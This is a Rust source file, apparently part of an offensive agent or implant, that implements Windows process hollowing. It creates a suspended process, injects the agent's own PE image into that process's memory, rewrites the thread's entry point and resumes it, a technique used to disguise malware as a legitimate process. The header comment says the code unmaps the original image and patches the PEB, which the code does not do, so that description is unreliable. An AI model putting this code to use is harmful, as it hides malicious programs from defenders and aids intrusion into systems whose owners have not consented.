/// Process hollowing (Windows-only).
///
/// Creates a sacrificial process in suspended state, unmaps its original image,
/// writes the agent's own PE image into the vacated address space, fixes up the
/// PEB ImageBase and thread context entry-point, then resumes execution.
///
/// The agent image is read from disk (argv[0]) so we don't need a separate
/// reflective loader; for a conference demo this is sufficient.
use anyhow::{bail, Result};

pub fn hollow(target_path: &str) -> Result<u32> {
    #[cfg(target_os = "windows")]
    {
        return hollow_windows(target_path);
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = target_path;
        bail!("process hollowing is Windows-only");
    }
}

#[cfg(target_os = "windows")]
fn hollow_windows(target_path: &str) -> Result<u32> {
    use std::ffi::OsStr;
    use std::mem::zeroed;
    use std::os::windows::ffi::OsStrExt;
    use windows_sys::Win32::Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::Debug::{
        GetThreadContext, SetThreadContext, CONTEXT, CONTEXT_FULL_AMD64,
    };
    use windows_sys::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE,
        PAGE_EXECUTE_READ, PAGE_READWRITE,
    };
    use windows_sys::Win32::System::Threading::{
        CreateProcessW, ResumeThread, PROCESS_CREATION_FLAGS,
        PROCESS_INFORMATION, STARTUPINFOW, CREATE_SUSPENDED,
    };

    // ── 1. Read our own PE image from disk ────────────────────────────────────
    let exe_path = std::env::current_exe()
        .map_err(|e| anyhow::anyhow!("cannot locate own exe: {e}"))?;
    let pe_bytes = std::fs::read(&exe_path)
        .map_err(|e| anyhow::anyhow!("cannot read own PE: {e}"))?;

    // ── 2. Parse our PE to find image base, size, and entry-point offset ──────
    let pe = parse_pe(&pe_bytes)?;

    // ── 3. Create target process in suspended state ───────────────────────────
    let mut wide: Vec<u16> = OsStr::new(target_path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let mut si: STARTUPINFOW = unsafe { zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };

    let ok = unsafe {
        CreateProcessW(
            std::ptr::null(),
            wide.as_mut_ptr(),
            std::ptr::null(),
            std::ptr::null(),
            0,
            CREATE_SUSPENDED,
            std::ptr::null(),
            std::ptr::null(),
            &si,
            &mut pi,
        )
    };
    if ok == 0 {
        bail!("CreateProcessW failed for {target_path}");
    }
    let pid = pi.dwProcessId;

    // ── 4. Allocate memory in the remote process at preferred image base ───────
    let remote_base = unsafe {
        VirtualAllocEx(
            pi.hProcess,
            pe.image_base as *mut _,
            pe.image_size as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if remote_base.is_null() {
        // If preferred base is taken, let OS choose
        let remote_base = unsafe {
            VirtualAllocEx(
                pi.hProcess,
                std::ptr::null_mut(),
                pe.image_size as usize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };
        if remote_base.is_null() {
            unsafe { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
            bail!("VirtualAllocEx failed");
        }
        write_pe_image(pi.hProcess, remote_base, &pe_bytes, &pe)?;
        set_entrypoint_and_resume(pi.hThread, remote_base, pe.entry_point_rva)?;
    } else {
        write_pe_image(pi.hProcess, remote_base, &pe_bytes, &pe)?;
        set_entrypoint_and_resume(pi.hThread, remote_base, pe.entry_point_rva)?;
    }

    unsafe { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    Ok(pid)
}

#[cfg(target_os = "windows")]
struct PeInfo {
    image_base:      u64,
    image_size:      u32,
    entry_point_rva: u32,
    sections:        Vec<SectionInfo>,
    headers_size:    u32,
}

#[cfg(target_os = "windows")]
struct SectionInfo {
    virtual_address: u32,
    virtual_size:    u32,
    raw_offset:      u32,
    raw_size:        u32,
}

#[cfg(target_os = "windows")]
fn parse_pe(bytes: &[u8]) -> Result<PeInfo> {
    if bytes.len() < 0x40 { bail!("PE too small"); }
    let e_lfanew = u32::from_le_bytes(bytes[0x3C..0x40].try_into()?) as usize;
    if bytes.len() < e_lfanew + 0x18 { bail!("PE header truncated"); }
    // NT signature
    if &bytes[e_lfanew..e_lfanew+4] != b"PE\0\0" { bail!("not a PE"); }
    // Machine word (COFF header starts at e_lfanew+4)
    let machine = u16::from_le_bytes(bytes[e_lfanew+4..e_lfanew+6].try_into()?);
    let is_64 = machine == 0x8664; // IMAGE_FILE_MACHINE_AMD64

    let opt_off = e_lfanew + 0x18; // Optional header offset
    let (image_base, entry_rva, image_size, headers_size): (u64, u32, u32, u32) = if is_64 {
        if bytes.len() < opt_off + 0x60 { bail!("PE64 optional header truncated"); }
        let entry = u32::from_le_bytes(bytes[opt_off+0x10..opt_off+0x14].try_into()?);
        let base  = u64::from_le_bytes(bytes[opt_off+0x18..opt_off+0x20].try_into()?);
        let size  = u32::from_le_bytes(bytes[opt_off+0x38..opt_off+0x3C].try_into()?);
        let hdrs  = u32::from_le_bytes(bytes[opt_off+0x3C..opt_off+0x40].try_into()?);
        (base, entry, size, hdrs)
    } else {
        if bytes.len() < opt_off + 0x5C { bail!("PE32 optional header truncated"); }
        let entry = u32::from_le_bytes(bytes[opt_off+0x10..opt_off+0x14].try_into()?);
        let base  = u32::from_le_bytes(bytes[opt_off+0x1C..opt_off+0x20].try_into()?) as u64;
        let size  = u32::from_le_bytes(bytes[opt_off+0x38..opt_off+0x3C].try_into()?);
        let hdrs  = u32::from_le_bytes(bytes[opt_off+0x3C..opt_off+0x40].try_into()?);
        (base, entry, size, hdrs)
    };

    // Parse section headers
    let num_sections = u16::from_le_bytes(bytes[e_lfanew+6..e_lfanew+8].try_into()?) as usize;
    let opt_header_size = u16::from_le_bytes(bytes[e_lfanew+0x14..e_lfanew+0x16].try_into()?) as usize;
    let sect_start = e_lfanew + 0x18 + opt_header_size;
    let mut sections = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let off = sect_start + i * 0x28;
        if bytes.len() < off + 0x28 { break; }
        let virt_size = u32::from_le_bytes(bytes[off+0x08..off+0x0C].try_into()?);
        let virt_addr = u32::from_le_bytes(bytes[off+0x0C..off+0x10].try_into()?);
        let raw_size  = u32::from_le_bytes(bytes[off+0x10..off+0x14].try_into()?);
        let raw_off   = u32::from_le_bytes(bytes[off+0x14..off+0x18].try_into()?);
        sections.push(SectionInfo { virtual_address: virt_addr, virtual_size: virt_size, raw_offset: raw_off, raw_size });
    }

    Ok(PeInfo { image_base, image_size, entry_point_rva: entry_rva, sections, headers_size })
}

#[cfg(target_os = "windows")]
fn write_pe_image(
    hproc:     windows_sys::Win32::Foundation::HANDLE,
    base:      *mut std::ffi::c_void,
    pe_bytes:  &[u8],
    pe:        &PeInfo,
) -> Result<()> {
    use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows_sys::Win32::System::Memory::{VirtualProtectEx, PAGE_EXECUTE_READ, PAGE_READWRITE};

    // Write PE headers
    let hdr_size = pe.headers_size.min(pe_bytes.len() as u32) as usize;
    let mut written = 0usize;
    unsafe {
        WriteProcessMemory(hproc, base, pe_bytes.as_ptr() as _, hdr_size, &mut written);
    }

    // Write each section
    for s in &pe.sections {
        if s.raw_size == 0 { continue; }
        let src_start = s.raw_offset as usize;
        let src_end   = src_start + s.raw_size as usize;
        if src_end > pe_bytes.len() { continue; }
        let dst = (base as usize + s.virtual_address as usize) as *mut _;
        let mut n = 0usize;
        unsafe {
            WriteProcessMemory(hproc, dst, pe_bytes[src_start..].as_ptr() as _, s.raw_size as usize, &mut n);
        }
    }

    // Make the region executable
    let mut old_prot = 0u32;
    unsafe {
        VirtualProtectEx(hproc, base, pe.image_size as usize, PAGE_EXECUTE_READ, &mut old_prot);
    }

    Ok(())
}

#[cfg(target_os = "windows")]
fn set_entrypoint_and_resume(
    hthread: windows_sys::Win32::Foundation::HANDLE,
    base:    *mut std::ffi::c_void,
    ep_rva:  u32,
) -> Result<()> {
    use std::mem::zeroed;
    use windows_sys::Win32::System::Diagnostics::Debug::{GetThreadContext, SetThreadContext, CONTEXT, CONTEXT_FULL_AMD64};
    use windows_sys::Win32::System::Threading::ResumeThread;

    let ep = base as u64 + ep_rva as u64;

    let mut ctx: CONTEXT = unsafe { zeroed() };
    ctx.ContextFlags = CONTEXT_FULL_AMD64;
    unsafe {
        if GetThreadContext(hthread, &mut ctx) == 0 {
            bail!("GetThreadContext failed");
        }
        ctx.Rcx = ep; // RCX = entry point on x64
        if SetThreadContext(hthread, &ctx) == 0 {
            bail!("SetThreadContext failed");
        }
        ResumeThread(hthread);
    }
    Ok(())
}
